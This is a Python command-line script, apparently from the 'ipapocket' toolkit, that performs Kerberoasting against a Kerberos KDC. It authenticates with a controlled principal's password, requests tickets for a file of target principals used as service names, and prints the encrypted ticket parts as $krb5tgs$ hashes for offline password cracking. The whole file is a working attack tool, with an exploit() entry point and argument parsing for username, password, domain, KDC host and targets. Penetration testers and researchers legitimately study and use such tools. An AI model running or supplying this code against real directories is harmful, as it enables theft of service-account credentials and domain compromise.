#!/usr/bin/env python

import logging
import argparse
import sys
from ipapocket.utils import logger
from ipapocket.exceptions.exceptions import UnexpectedKerberosError
from ipapocket.krb5.types import *
from ipapocket.krb5.constants import *
from ipapocket.krb5.operations import BaseKrb5Operations
from ipapocket.network.krb5 import Krb5Network
from ipapocket.krb5.crypto.crypto import *
from binascii import hexlify

class Storage:
    _etype: EncryptionType = None
    _cipher: str = None

    def __init__(self, etype=None):
        self.etype = etype

    @property
    def etype(self) -> EncryptionType:
        return self._etype

    @etype.setter
    def etype(self, value) -> None:
        self._etype = value

    @property
    def cipher(self) -> str:
        return self._cipher

    @cipher.setter
    def cipher(self, value) -> None:
        self._cipher = value


class Kerberoasting:
    _base: BaseKrb5Operations = None
    _username: str = None
    _password: str = None
    _domain: str = None
    _host: str = None
    _target_principals: list[str] = None
    _storage: dict[str, Storage] = None
    _krb5client: Krb5Network = None

    def __init__(self, username, password, domain, host, principals):
        self._base = BaseKrb5Operations(username=username, domain=domain)
        self._username = username
        self._password = password
        self._domain = domain
        self._host = host
        self._target_principals = principals
        self._storage = dict[str, Storage]()
        self._krb5client = Krb5Network(host)
        self._base_custom = BaseKrb5Operations(domain=domain)

    def get_base(self) -> bool:
        logging.info("get etype for controller principal")
        logging.debug("create AS-REQ without PA for controlled user {}".format(self._username))
        response = self._krb5client.sendrcv(self._base.as_req_without_pa(username=self._username))

        if not response.is_krb_error():
            logging.error("controlled principal {} has no PREAUTH, unable process".format(self._username))
            return False
        else:
            error = response.krb_error
            if error.error_code != ErrorCode.KDC_ERR_PREAUTH_REQUIRED:
                logging.error("unexpected KRB error type {}".format(error.error_code.name))
                return False
            else:
                self._base.as_req_preffered_etype(error)
                self._key = string_to_key(self._base.etype, self._password, self._base.salt)
                return True

    def get_tickets(self):
        logging.info("get tickets using target principals as service names")
        for k in self._target_principals:
            response = self._krb5client.sendrcv(self._base_custom.as_req_with_pa(username=self._username, etype=self._key.enctype, key=self._key, service=k))

            if response.is_krb_error():
                if response.krb_error.error_code == ErrorCode.KDC_ERR_PREAUTH_FAILED:
                    raise Exception("invalid credentials supplied for controlled principal {}".format(self._username))
                else:
                    logging.debug("unexpected KRB error {} in AS-REQ with service name {}".format(response.krb_error.error_code.name, k))
            else:
                self._storage[k] = Storage()
                self._storage[k].cipher = response.as_rep.kdc_rep.ticket.enc_part.cipher
                self._storage[k].etype = response.as_rep.kdc_rep.ticket.enc_part.etype

    def output_hashes(self):
        logging.info("print hashes")
        for k, v in self._storage.items():
            if v.etype.value == 17:
                c, h = get_etype_profile(v.etype).splitter(v.cipher)
                entry = "$krb5tgs$%d$%s$%s$%s$%s" % (v.etype.value, k, self._domain.upper(), hexlify(h).decode(), hexlify(c).decode())
                print(entry)
            if v.etype.value == 18:
                c, h = get_etype_profile(v.etype).splitter(v.cipher)
                entry = "$krb5tgs$%d$%s$%s$%s$%s" % (v.etype.value, k, self._domain.upper(), hexlify(h).decode(), hexlify(c).decode())
                print(entry)
            if v.etype.value == 23:
                entry = "$krb5tgs$%d$*%s$%s$http/dc.%s@%s*$%s$%s" % (v.etype.value, k, self._domain.upper(), self._domain.lower(), self._domain.lower(), v.cipher.hex()[:32], v.cipher.hex()[32:])
                print(entry)

    def exploit(self):
        if not self.get_base():
            sys.exit(1)
        try:
            self.get_tickets()
        except Exception as e:
            logging.error("{}".format(e))
            sys.exit(1)
        self.output_hashes()


if __name__ == "__main__":
    logger.init()
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument("-u", "--username", required=True, action="store", help="Username of controlled principal")
    parser.add_argument("-p", "--password", required=True, action="store", help="Password of controlled principal")
    parser.add_argument("-d", "--domain", required=True, action="store", help="Domain name, e.g. domain.local")
    parser.add_argument("-H", "--host", required=True, action="store", help="IP address or FQDN of KDC")
    parser.add_argument("-v", "--verbose", required=False, action="store_true", help="Verbose mode")
    parser.add_argument("-t", "--targets", required=True, action="store", help="Path to file with target principals")

    options = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    if options.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    with open(options.targets, "r") as f:
        principals = f.read().splitlines()

    attack = Kerberoasting(options.username, options.password, options.domain, options.host, principals)
    try:
        attack.exploit()
    except UnexpectedKerberosError as e:
        print(e)